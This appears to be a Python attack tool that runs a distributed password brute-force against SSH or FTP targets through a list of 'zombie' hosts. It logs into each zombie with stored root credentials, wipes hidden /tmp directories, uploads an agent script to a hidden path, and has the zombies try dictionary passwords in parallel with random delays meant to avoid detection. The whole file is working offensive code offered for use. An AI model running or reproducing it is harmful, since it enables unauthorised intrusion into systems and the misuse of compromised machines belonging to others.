#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import optparse
import time
import random
import paramiko
import hashlib
import os
import sys
from threading import*

conn_no = 5
conn_lock = Semaphore(value=conn_no)
Found = False
Fails = 0
waitime = 5
agent_script_name = "zombie.py"
remote_path = "/tmp/."+hashlib.md5(str(time.time()).encode("utf8")).hexdigest()+"/"

def get_zombies(zombie_file):
    zombie_list = []
    fp = open(zombie_file,'r')
    
    for line in fp.readlines():
        zombie_list.append(line.strip('\r').strip('\n'))
    return zombie_list

def zombie_scp(s,local_file,remote_path):
    sftp = paramiko.SFTPClient.from_transport(s.get_transport())
    sftp = s.open_sftp()
    sftp.put(local_file, remote_path)

def check_zombies(zombie_list):
    local_file = agent_script_name
    count = 0
    while count < len(zombie_list):
        try:
            zombie_info = zombie_list[count]
            zmb_host = zombie_info.split(':',2)[0]
            zmb_user = zombie_info.split(':',2)[1]
            zmb_pwd = zombie_info.split(':',2)[2]
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
            ssh.exec_command("a=($(ls -a /tmp|grep '\.'|awk '{if(length($0)==33) {print $0}}')) && \
                for i in \"${a[@]}\";do rm -rf /tmp/\"$i\";done; mkdir -p " + remote_path)
            time.sleep(1)
            zombie_scp(ssh, local_file, remote_path + local_file)
            stdin, stdout, stderr = ssh.exec_command("/usr/bin/python3 -c \"import paramiko;from ftplib import FTP\"&& echo \"anything ok!\"")
            if "anything ok!" not in stdout.read().decode():
                print ("...Zombie-host(%s)\t:\033[1;31m%s\033[0m...%s." %(zmb_host,"unavailable","Failed to start C2agent"))
                del(zombie_list[count])
                continue
            print ("...Zombie-host(%s)\t:\033[1;32m%s\033[0m" %(zmb_host,"available"))
            count+=1
        except Exception as e:
            print ("...Zombie-host(%s)\t:\033[1;31m%s\033[0m...%s" %(zmb_host,"unavailable",e))
            del(zombie_list[count])
            pass
    if zombie_list:
        #print zombie_list
        return zombie_list
    else:
        print ("\033[1;31m[Err]\033[0m None zombie-host available.\n")
        exit(1)
        
#This function have 2.5~5s basic delay.
def zombie_work(s, target_link, user, password):
    global Found
    payload = "cd %s; /usr/bin/python3 zombie.py -T %s -u %s -p %s" %(remote_path, target_link, user, password)
    #print (payload)
    stdin, stdout, stderr = s.exec_command(payload)
    if "{successful:" in stdout.read().decode():
        Found = True
        print ("\n[+] Congratulations. The password is: \033[1;32m%s\033[0m" % password)
        conn_lock.release()
        exit(0)

def conduct_zombie(target_link, user, password, zombie, release):
    global Found
    global waitime
    zmb_host = zombie.split(':',2)[0]
    zmb_user = zombie.split(':',2)[1]
    zmb_pwd = zombie.split(':',2)[2]
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
        #a=time.time()
        zombie_work(ssh, target_link, user, password)
        #print(time.time()-a)
        ssh.close()
    except Exception as e:
        print ("\n\033[1;33m[Wrn]\033[0m Zombie-host(%s) connection failed! %s" %(zmb_host,str(e)))
        pass
    finally:
        time.sleep(random.uniform(waitime, waitime * 2))
        conn_lock.release()
    

def check_target_info(options, parser):
    if options.target_link==None and (options.service_type==None or options.target_host==None or options.target_port==None):
        print ("\033[1;31m[Err]\033[0m Target information incorrect! Check & run again.")
        print (parser.usage)
        exit(1)
    if options.target_link==None: 
        target_link = options.service_type+"://"+options.target_host+":"+options.target_port
    else:
        if len(options.target_link.split(':',2)) != 3:
            print (parser.usage)
            exit(1)
    target_link = options.target_link
    return target_link
def precheck_connect_policy(options, zombie_available):
    global waitime
    try:
        if(options.waitime):
            waitime = float(options.waitime)
        if(options.conn_num):
            conn_num = int(options.conn_num)
            print ("...threads-number=%d ; available-zombies=%d ; thread_dealy=(%d,%d)." %(conn_num,zombie_available,waitime,2*waitime))
            if zombie_available == 1 and conn_num >= 10:
                print ("\033[1;33m[Wrn]\033[0m Dangerous!! The results might be unpredictable.")
            elif zombie_available >= 10 and conn_num > zombie_available:
                print ("\033[1;33m[Wrn]\033[0m Set threads-number=%d , due to resource limit." %(zombie_available))
                conn_num = zombie_available
        print("\033[1;33m[Wrn]\033[0m Watch out! Too much connection request may be detected and reach the limit of service .")
    except Exception as e:
        print ("\033[1;31m[Err]\033[0m Check and run again."+str(e))
        exit(1)
    return conn_num,waitime
def main():
    global conn_lock

    parser = optparse.OptionParser('usage % prog [-S <srv_type> -H <target_host> -p <target_port>]|[-T <target_link>] \n\t-u <user> '\
                                   + '-P <password-list> -Z <zombie_file>  -t <threads> -c <interval>' )
    parser.add_option('-S', '--srv_type', dest = 'service_type', type = 'string' , default = 'ssh' , help = 'Support: ssh,ftp.    @TODO telnet/custom ')
    parser.add_option('-H', '--host', dest = 'target_host', type = 'string', help = 'Host IP of target.')
    parser.add_option('-p', '--port', dest = 'target_port', default = '22', help = 'Port to connect to on the target.')
    parser.add_option('-T', '--target', dest = 'target_link', type = 'string' , help = 'Provide target information. Format: ssh://10.1.1.1:22')
    parser.add_option('-u', '--username', dest = 'user', type = 'string', help = 'Provide username when connect to the target. ')
    parser.add_option('-P', '--passwdfile', dest = 'passwd_file', type = 'string', help = 'Dictionary of passwords.')
    parser.add_option('-Z', '--zombiefile', dest = 'zombie_file', type = 'string', help = 'Provide zombie\'s resource. Format: 192.168.0.1:root:toor.')
    parser.add_option('-t', '--threads', dest = 'conn_num', type = 'string', help = 'Run threads number of connects in parallel. default 5.')
    parser.add_option('-c', '--interval', dest = 'waitime', type = 'string', help = 'Defines the minimum wait time in seconds, default 5s. '\
                      + 'DBF use random time interval technology. The actual time interval is 5.0~10.0 seconds.')
    (options,args) = parser.parse_args()
    
#check target information
    target_link = check_target_info(options,parser)
    user = 'root'
    passwd_file = options.passwd_file
    if options.user:
        user = options.user
    else :
        print ("\033[1;33m[Wrn]\033[0m Target username is not specified, use `root`.")
    print ("[+] Target --> %s/?username=%s&passwdfile=%s"  %(target_link, user, passwd_file))
# check zombies
    zombie_file = options.zombie_file
    print ("[+] Check zombies......")
    zombie_list = get_zombies(zombie_file)
    zombie_total = len(zombie_list)
    zombie_list = check_zombies(zombie_list)
    zombie_available = len(zombie_list)
    print ("> (%d/%d) zombies available." %(zombie_available, zombie_total))
    
# check_policy
    print ("[+] Check bruteforce policy......")
    conn_num,_ = precheck_connect_policy(options, zombie_available)
    conn_lock = Semaphore(value=conn_num)
# fire on target!

    cmd_get_rows_num = "wc -l "+ passwd_file +" |awk '{print $1}' | sed -n '1p'"
    try:
        passwd_total = os.popen(cmd_get_rows_num).readlines()[0].strip()
    except IndexError:
        print ("\033[1;31m[Err]\033[0m Passwords file not exist.")
        exit(1)
    print ("[+] Fire in few seconds. Please wait......")
    time.sleep(2)
    fp = open(passwd_file,'r')
    count = 0
    for password in fp.readlines():
        if Found == True:
            exit(0)
        if not count%1:
            print ("\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count) ,end='')
            sys.stdout.flush()
        count += 1
        zombie = zombie_list[count%zombie_available]
        password = password.strip('\r').strip('\n')
        
        conn_lock.acquire()
        t = Thread(target = conduct_zombie, args = (target_link, user, password, zombie, True))
        child = t.start()
    print ("\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count))
    print ("\033[1;33m[Wrn]\033[0m Found nothing.")

if __name__ == '__main__':
    main()

